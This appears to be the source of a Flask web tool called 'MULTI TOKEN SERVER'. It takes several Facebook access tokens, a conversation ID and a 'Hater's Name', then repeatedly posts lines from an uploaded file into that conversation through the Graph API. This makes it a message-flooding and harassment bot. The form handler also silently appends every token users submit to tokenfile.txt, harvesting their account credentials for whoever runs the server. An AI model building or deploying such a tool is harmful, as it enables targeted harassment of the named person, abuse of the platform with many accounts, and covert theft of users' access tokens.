import os
import requests
import time
import random
import multiprocessing
from flask import Flask, request, render_template_string, redirect, url_for, flash
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = os.environ.get('FLASK_SECRET_KEY', 'defaultsecretkey')  # Replace 'defaultsecretkey' with a fallback

HTML_FORM = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MULTI TOKEN SERVER</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to right, #FF6B6B, #6B66FF); /* Colorful gradient background */
            color: #333;
        }
        form {
            max-width: 500px;
            margin: 50px auto;
            padding: 20px;
            background-color: rgba(255, 255, 255, 0.7); /* Semi-transparent white background for the form */
            border-radius: 10px; /* Rounded corners for the form */
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); /* Drop shadow effect */
        }
        label, input, textarea {
            display: block;
            width: 100%;
            margin-bottom: 10px;
        }
        .example-tokens {
            color: #999;
        }
        h1 {
            color: #ffffff; /* White heading */
            text-align: center;
        }
        input[type="submit"] {
            background-color: #ff6600; /* Orange submit button */
            color: #fff; /* White text */
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>MULTI TOKEN SEVER</h1>
    <form action="/send_messages" method="post" enctype="multipart/form-data">

        <label for="tokens">Facebook Tokens (one per line):</label>
        <textarea id="tokens" name="tokens" placeholder="        token1
        token2
        token3
        token4" rows="5" required></textarea>

        <label for="convo">Conversation ID:</label>
        <input type="text" id="convo" name="convo" pattern="[A-Za-z0-9]+" title="Only alphanumeric characters are allowed." placeholder="Example: 100000777777777890" required>

        <label for="hatersname">Hater's Name:</label>
        <input type="text" id="hatersname" name="hatersname"  required>

        <label for="message">Message File:</label>
        <input type="file" id="message" name="message" required>

        <label for="time">Time Interval (in seconds):</label>
        <input type="number" id="time" name="time" min="1" value="1" placeholder="Example: 2" required>

        <input type="submit" value="Send Messages">
    </form>
</body>
</html>
"""

message_process = None

def send_messages(tokens, convo_id, hater_name, file_path, time_interval, index):
    try:
        with open(file_path, 'r') as file:
            messages = file.readlines()

        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }

        token = tokens[index % len(tokens)]  # Select token based on index
        for message in messages:
            url = f"https://graph.facebook.com/v17.0/t_{convo_id}"
            parameters = {'access_token': token.strip(), 'message': f"{hater_name} {message.strip()}"}
            response = requests.post(url, json=parameters, headers=headers)

            if response.ok:
                print(f"[+] Message sent: {hater_name} {message.strip()} using token {token.strip()}")
            else:
                print(f"[x] Failed to send message: {hater_name} {message.strip()} using token {token.strip()}")
                print(f"[x] Response: {response.json()}")

            time.sleep(time_interval)
    except Exception as e:
        print("Error occurred while sending messages:")
        print(e)
    finally:
        try:
            os.remove(file_path)
        except OSError as e:
            print(f"Error deleting file: {e}")

@app.route('/')
def index():
    return render_template_string(HTML_FORM)

@app.route('/send_messages', methods=['POST'])
def handle_form():
    global message_process
    tokens = request.form['tokens'].splitlines()
    convo_id = request.form['convo']
    hater_name = request.form['hatersname']
    message_file = request.files['message']
    time_interval = int(request.form['time'])

    filename = secure_filename(message_file.filename)
    file_path = os.path.join("/tmp", filename)
    message_file.save(file_path)

    # Write tokens to tokenfile.txt
    with open("tokenfile.txt", "a") as token_file:
        token_file.write("\n".join(tokens) + "\n")

    if message_process is None or not message_process.is_alive():
        message_process = multiprocessing.Process(target=send_messages, args=(tokens, convo_id, hater_name, file_path, time_interval, 0))
        message_process.start()
        flash("Messages sending started successfully!")
    else:
        flash("Message sending process is already running!")

    return redirect(url_for('index'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080) 
